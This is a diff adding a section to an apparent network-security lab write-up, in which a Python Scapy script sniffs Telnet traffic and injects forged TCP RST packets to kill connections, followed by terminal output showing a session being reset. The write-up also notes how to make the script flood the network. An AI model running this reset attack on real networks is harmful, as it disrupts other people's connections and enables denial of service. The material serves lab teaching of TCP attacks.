@@ -133,7 +133,57 @@ root@472341f5fb4b:/#
 
 ## Automatic
 
+We used this code to automate the attack. It will sniff any packet that uses the Telnet protocol and send in reply a RST packet. We can remove the last two conditions inside the `if` control to be more aggressive and flood the network.
 
+Remember to put the right interface in `pkt = sniff(iface = X, ...)`.
+
+```py
+#!/usr/bin/env python3
+from scapy.all import *
+
+flag = 0
+
+def sendrst(pkt):
+    global flag
+    if pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt[TCP].dport==23 and pkt[TCP].flags != 0x004 and flag==0:
+        src_add = pkt[IP].src
+        dst_add = pkt[IP].dst
+        ip = IP(src=src_add, dst=dst_add)
+
+        sp = pkt[TCP].sport
+        seq_n = pkt[TCP].seq
+        payload_l = len(pkt[TCP].payload)
+        tot_seq = seq_n+payload_l
+        tcp = TCP(sport=sp, dport=23, flags="R", seq=tot_seq, ack=0)
+
+        pkt = ip/tcp
+        print(f"Sent RST packet from {src_add}:{sp} to {dst_add}:23 with sequence number {tot_seq}")
+        send(pkt,verbose=0)
+        flag = 1
+
+pkt = sniff(iface ='br-774a3b00e93c', filter ='tcp', prn=sendrst)
+```
+
+In this example we run the code after the Telnet login:
+```bash
+root@472341f5fb4b:/# telnet 10.9.0.5
+Trying 10.9.0.5...
+Connected to 10.9.0.5.
+Escape character is '^]'.
+Ubuntu 20.04.1 LTS
+abb6db62e897 login: seed
+Password: 
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-54-generic x86_64)
+```
+
+We start the script, then we can see that just after typing any digit the connection will be closed due to the received RST.
+
+```bash
+seed@abb6db62e897:~$ aConnection closed by foreign host.
+root@472341f5fb4b:/# 
+```
+
+(Wireshark log)[Pictures/task_2/rst_auto_sent.PNG]
 
 # TASK 3
 
